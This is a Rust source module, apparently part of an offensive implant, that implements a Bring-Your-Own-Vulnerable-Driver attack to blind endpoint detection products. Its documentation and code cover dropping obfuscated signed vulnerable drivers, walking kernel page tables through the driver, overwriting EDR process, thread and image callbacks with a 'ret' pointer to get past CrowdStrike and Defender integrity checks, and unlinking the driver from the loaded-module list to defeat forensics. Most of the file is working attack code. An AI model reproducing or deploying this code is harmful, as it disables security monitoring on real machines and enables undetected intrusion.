//! Kernel callback overwrite module (BYOVD — Bring Your Own Vulnerable Driver).
//!
//! This module surgically overwrites EDR kernel callback function pointers to
//! point to a `ret` instruction instead of NULLing them. This defeats EDR
//! self-integrity checks (CrowdStrike, Microsoft Defender for Endpoint) that
//! verify their callbacks are still registered by checking if the pointer is
//! non-NULL. A ret pointer passes these checks (non-NULL, valid executable
//! memory) but causes the callback to immediately return without executing
//! any monitoring logic.
//!
//! # Architecture
//!
//! The module is divided into four sub-modules:
//!
//! - **`driver_db`**: Static database of 8 known vulnerable signed drivers
//!   (Dell, ASUS, Baidu, ENE, Gigabyte, Process Explorer, MSI Afterburner,
//!   WinRing0). Top 3 are embedded (XOR-obfuscated) in the agent binary.
//!
//! - **`deploy`**: Driver deployment — scans for pre-loaded drivers, drops
//!   embedded drivers to disk (obfuscated filename), loads via NtLoadDriver,
//!   deletes file from disk. Obtains device handles for IOCTL communication.
//!
//! - **`discover`**: Callback discovery — reads kernel memory to locate and
//!   enumerate EDR callbacks in PspCreateProcessNotifyRoutine,
//!   PspCreateThreadNotifyRoutine, PspLoadImageNotifyRoutine,
//!   CallbackListHead, and KeBugCheckCallbackListHead.
//!
//! - **`overwrite`**: Surgical overwrite — finds a `ret` instruction in
//!   ntoskrnl.exe, overwrites each EDR callback's function pointer to point
//!   to ret, saves backups for restore, and unlinks the vulnerable driver
//!   from PsLoadedModuleList.
//!
//! # Safety
//!
//! - KeBugCheckCallbackListHead entries are **never** overwritten (BSOD risk)
//! - Original pointers are saved for `KernelCallbackRestore`
//! - Failed physical memory writes are skipped (no garbage writes)
//! - Driver is unlinked from PsLoadedModuleList after overwrite
//!
//! # NT API Usage
//!
//! All NT API calls go through `syscall!`.
//! All strings through `string_crypt`.

pub mod deploy;
pub mod discover;
pub mod driver_db;
pub mod overwrite;
pub mod proxy;

use anyhow::{bail, Context, Result};

// ── Shared VA→PA translation ───────────────────────────────────────────────
// Used by both `discover` and `overwrite` sub-modules to avoid duplicating
// the 4-level x64 page-table walk logic.

/// Perform a 4-level x64 page-table walk to translate a virtual address
/// to a physical address.
///
/// The walk traverses PML4 → PDPT → PD → PT → physical page.
/// Each level uses 9 bits of the virtual address as an index into the
/// current page-table page.  The entry's bits 12..51 give the next-level
/// physical page frame number (PFN).
///
/// # Arguments
/// * `driver`         — The vulnerable driver in use.
/// * `device_handle`  — Open handle to the driver's device.
/// * `cr3`            — Physical address of the PML4 root (from CR3 /
///                       DirectoryTableBase).  Only bits 12..51 are used.
/// * `virtual_address`— The virtual address to translate.
///
/// # Returns
/// The corresponding physical address on success.
pub fn translate_va_to_pa(
    driver: &driver_db::VulnerableDriver,
    device_handle: usize,
    cr3: u64,
    virtual_address: u64,
) -> Result<u64> {
    // x64 virtual address layout (4-level paging):
    //   [63:48] sign extension (must match bit 47)
    //   [47:39] PML4 index   (9 bits)
    //   [38:30] PDPT index   (9 bits)
    //   [29:21] PD index     (9 bits)
    //   [20:12] PT index     (9 bits)
    //   [11: 0] page offset  (12 bits)

    let pml4_idx = (virtual_address >> 39) & 0x1FF;
    let pdpt_idx = (virtual_address >> 30) & 0x1FF;
    let pd_idx = (virtual_address >> 21) & 0x1FF;
    let pt_idx = (virtual_address >> 12) & 0x1FF;
    let offset = virtual_address & 0xFFF;

    // Mask to extract PFN from a page-table entry (bits 12..51).
    const PFN_MASK: u64 = 0x000F_FFFF_FFFF_F000;
    // Present bit.
    const PTE_PRESENT: u64 = 1;
    // Large page bit (PS — bit 7).  When set at PD level → 2 MB page;
    // at PDPT level → 1 GB page.  No further walk needed.
    const PTE_PS: u64 = 1 << 7;

    let read_entry = |phys_addr: u64, idx: u64| -> Result<u64> {
        let mut buf = [0u8; 8];
        // We must use physical addresses for the page-table walk itself.
        // deploy::read_physical_memory is safe here because page-table
        // pages are always at physical addresses.
        unsafe {
            deploy::read_physical_memory(driver, device_handle, phys_addr + idx * 8, &mut buf)?;
        }
        Ok(u64::from_le_bytes(buf))
    };

    // Level 1 — PML4
    let pml4_base = cr3 & PFN_MASK;
    let pml4e = read_entry(pml4_base, pml4_idx)?;
    if pml4e & PTE_PRESENT == 0 {
        bail!(
            "PML4E not present for VA 0x{:016X} (PML4 base 0x{:016X}, idx {})",
            virtual_address,
            pml4_base,
            pml4_idx
        );
    }

    // Level 2 — PDPT
    let pdpt_base = pml4e & PFN_MASK;
    let pdpte = read_entry(pdpt_base, pdpt_idx)?;
    if pdpte & PTE_PRESENT == 0 {
        bail!(
            "PDPTE not present for VA 0x{:016X} (PDPT base 0x{:016X}, idx {})",
            virtual_address,
            pdpt_base,
            pdpt_idx
        );
    }
    // 1 GB large page
    if pdpte & PTE_PS != 0 {
        let phys = (pdpte & 0x000F_FFFF_C000_0000) + (virtual_address & 0x3FFF_FFFF);
        return Ok(phys);
    }

    // Level 3 — PD
    let pd_base = pdpte & PFN_MASK;
    let pde = read_entry(pd_base, pd_idx)?;
    if pde & PTE_PRESENT == 0 {
        bail!(
            "PDE not present for VA 0x{:016X} (PD base 0x{:016X}, idx {})",
            virtual_address,
            pd_base,
            pd_idx
        );
    }
    // 2 MB large page
    if pde & PTE_PS != 0 {
        let phys = (pde & 0x000F_FFFF_FFE0_0000) + (virtual_address & 0x1F_FFFF);
        return Ok(phys);
    }

    // Level 4 — PT
    let pt_base = pde & PFN_MASK;
    let pte = read_entry(pt_base, pt_idx)?;
    if pte & PTE_PRESENT == 0 {
        bail!(
            "PTE not present for VA 0x{:016X} (PT base 0x{:016X}, idx {})",
            virtual_address,
            pt_base,
            pt_idx
        );
    }

    let phys_page = pte & PFN_MASK;
    Ok(phys_page + offset)
}

// ── Build-specific DirectoryTableBase offset ───────────────────────────────

/// Build-to-offset table for `_KPROCESS.DirectoryTableBase`.
///
/// The offset of `DirectoryTableBase` within `_KPROCESS` (which is embedded
/// at the start of `_EPROCESS`) varies across Windows builds.  On all
/// currently-supported x64 builds it is `0x28`, but future builds may shift
/// it.  Matching the pattern used in `cet_bypass.rs` for shadow-stack
/// offsets, we look up the offset from this table by build number.
///
/// Returns the offset from the highest entry whose build ≤ the requested
/// build, allowing forward-compatible approximation for minor updates.
/// If the build is not in the table (or older than the minimum), `None` is
/// returned and the caller must refuse to operate.
const DTB_OFFSETS: &[(u32, usize)] = &[
    // Windows 10 2004 / 20H2 / 21H1 / 21H2
    (19041, 0x28),
    (19042, 0x28),
    (19044, 0x28),
    // Windows 10 22H2
    (19045, 0x28),
    // Windows 11 21H2
    (22000, 0x28),
    // Windows 11 22H2
    (22621, 0x28),
    // Windows 11 23H2
    (22631, 0x28),
    // Windows 11 24H2
    (26100, 0x28),
];

/// Look up the `_KPROCESS.DirectoryTableBase` offset for a given build number.
///
/// Returns the offset from the highest entry whose build ≤ the requested
/// build, or `None` if the build is older than the minimum known entry.
pub fn dtb_offset_for_build(build: u32) -> Option<usize> {
    let mut best: Option<usize> = None;
    for &(b, off) in DTB_OFFSETS {
        if b <= build {
            best = Some(off);
        } else {
            break; // table is sorted ascending
        }
    }
    best
}

/// Resolve CR3 (DirectoryTableBase) by reading the initial system process.
///
/// On x64 Windows the kernel shares a single page-table root (CR3) for all
/// processes via the _KPROCESS.DirectoryTableBase field.  We resolve
/// `PsInitialSystemProcess`, read the _EPROCESS, and extract the value at
/// a build-specific offset (DirectoryTableBase in _KPROCESS, which is the
/// first embedded struct in _EPROCESS).
///
/// # Safety / Conservatism
/// If the Windows build number is not in the known-offset table, this
/// function logs a warning and returns an error rather than risking
/// corrupting kernel memory with a wrong offset.
pub fn resolve_cr3(
    driver: &driver_db::VulnerableDriver,
    device_handle: usize,
    kernel_base: u64,
) -> Result<u64> {
    // Look up the DirectoryTableBase offset for the current build.
    let build = crate::syscalls::get_build_number();
    let dtb_offset = dtb_offset_for_build(build).with_context(|| {
        format!(
            "unknown Windows build {} — cannot safely determine \
             DirectoryTableBase offset; refusing to operate",
            build
        )
    })?;
    // Resolve PsInitialSystemProcess — points to the initial _EPROCESS.
    let eprocess = discover::resolve_kernel_symbol(
        driver,
        device_handle,
        kernel_base,
        "PsInitialSystemProcess",
    )
    .context("failed to resolve PsInitialSystemProcess")?;

    // PsInitialSystemProcess is a pointer to _EPROCESS.  Read the pointer.
    let mut ptr_buf = [0u8; 8];
    // This first read is a kernel virtual address.  Most drivers handle
    // VA fine (MmMapIoSpace), so we use the raw address.  If the driver
    // needs physical addresses, we have a chicken-and-egg problem: we
    // need CR3 to translate, but we need to read to get CR3.  The
    // solution is that PsInitialSystemProcess lives in the kernel's
    // .data section which is mapped 1:1 via the HAL identity mapping
    // (MmGetPhysicalAddress works even without our translation).
    unsafe {
        deploy::read_physical_memory(driver, device_handle, eprocess, &mut ptr_buf)?;
    }
    let eprocess_addr = u64::from_le_bytes(ptr_buf);

    if eprocess_addr == 0 {
        bail!("PsInitialSystemProcess is NULL");
    }

    // _KPROCESS is embedded at the start of _EPROCESS.
    // DirectoryTableBase offset is build-specific (see DTB_OFFSETS table).
    let directory_table_base_offset = dtb_offset as u64;
    let mut cr3_buf = [0u8; 8];
    unsafe {
        deploy::read_physical_memory(
            driver,
            device_handle,
            eprocess_addr + directory_table_base_offset,
            &mut cr3_buf,
        )?;
    }
    let cr3 = u64::from_le_bytes(cr3_buf);

    if cr3 == 0 || cr3 & 0xFFF != 0 {
        bail!(
            "Invalid CR3 value read from DirectoryTableBase: 0x{:016X}",
            cr3
        );
    }

    log::info!(
        "Resolved CR3 from PsInitialSystemProcess: 0x{:016X} (build={}, DTB offset=0x{:X})",
        cr3,
        build,
        directory_table_base_offset
    );
    Ok(cr3)
}

/// Perform a kernel callback scan: discover all registered EDR callbacks.
///
/// # Returns
/// JSON-serialized scan result on success.
pub fn scan(session_key: &[u8]) -> Result<String> {
    // Step 1: Find or deploy a vulnerable driver.
    let deployed =
        deploy::deploy(&[], session_key).context("failed to deploy vulnerable driver for scan")?;

    // Step 2: Scan for callbacks.
    let result = discover::scan_callbacks(&deployed).context("callback scan failed")?;

    // Serialize to JSON.
    let json = serde_json::to_string_pretty(&result).unwrap_or_else(|_| {
        format!(
            "{{\"error\": \"serialization failed\", \"total_count\": {}}}",
            result.total_count
        )
    });

    // If we freshly deployed the driver, clean it up after scan-only.
    if !deployed.was_preloaded {
        unsafe {
            let _ = deploy::cleanup_driver();
        }
    }

    Ok(json)
}

/// Perform a kernel callback nuke: overwrite EDR callbacks with ret.
///
/// # Arguments
/// * `preferred_drivers` - Optional list of driver names to try (empty = all)
/// * `session_key` - HKDF session key for driver resource decryption
///
/// # Returns
/// JSON-serialized nuke result on success.
pub fn nuke(preferred_drivers: &[String], session_key: &[u8]) -> Result<String> {
    // Step 1: Find or deploy a vulnerable driver.
    let deployed = deploy::deploy(preferred_drivers, session_key)
        .context("failed to deploy vulnerable driver for nuke")?;

    // Step 2: Perform the overwrite.
    let result = overwrite::nuke_callbacks(&deployed).context("callback nuke failed")?;

    // Serialize to JSON.
    let json = serde_json::to_string_pretty(&result)
        .unwrap_or_else(|_| "{\"error\": \"serialization failed\"}".to_string());

    // Note: We do NOT clean up the driver here. The driver stays loaded
    // for the restore operation. The overwrite module already unlinks it
    // from PsLoadedModuleList for anti-forensic purposes.

    Ok(json)
}

/// Restore all previously overwritten kernel callback pointers.
///
/// # Returns
/// JSON-serialized restore result on success.
pub fn restore(session_key: &[u8]) -> Result<String> {
    // Check if we have backups to restore.
    if !overwrite::has_backups() {
        return Err(anyhow::anyhow!(
            "no callback backups available for restore (no prior KernelCallbackNuke in this session)"
        ));
    }

    // We need the deployed driver for physical memory write access.
    // Try to get the currently deployed one, or deploy a new one.
    let deployed = match deploy::get_deployed_driver() {
        Some(d) => d,
        None => deploy::deploy(&[], session_key)
            .context("failed to deploy vulnerable driver for restore")?,
    };

    // Restore the callbacks.
    let result = overwrite::restore_callbacks(&deployed).context("callback restore failed")?;

    // Now clean up the driver deployment.
    unsafe {
        let _ = deploy::cleanup_driver();
    }

    let json = serde_json::to_string_pretty(&result)
        .unwrap_or_else(|_| "{\"error\": \"serialization failed\"}".to_string());

    Ok(json)
}

/// Get a status summary of the kernel callback subsystem.
///
/// Returns JSON with: backup count, deployed driver status, etc.
pub fn status() -> String {
    let backup_count = overwrite::get_backup_snapshot().len();
    let deployed = deploy::get_deployed_driver();

    let status = serde_json::json!({
        "backups_available": backup_count,
        "driver_deployed": deployed.is_some(),
        "driver_name": deployed.as_ref().map(|d| d.driver.name).unwrap_or("none"),
        "driver_preloaded": deployed.as_ref().map(|d| d.was_preloaded).unwrap_or(false),
    });

    serde_json::to_string_pretty(&status).unwrap_or_default()
}
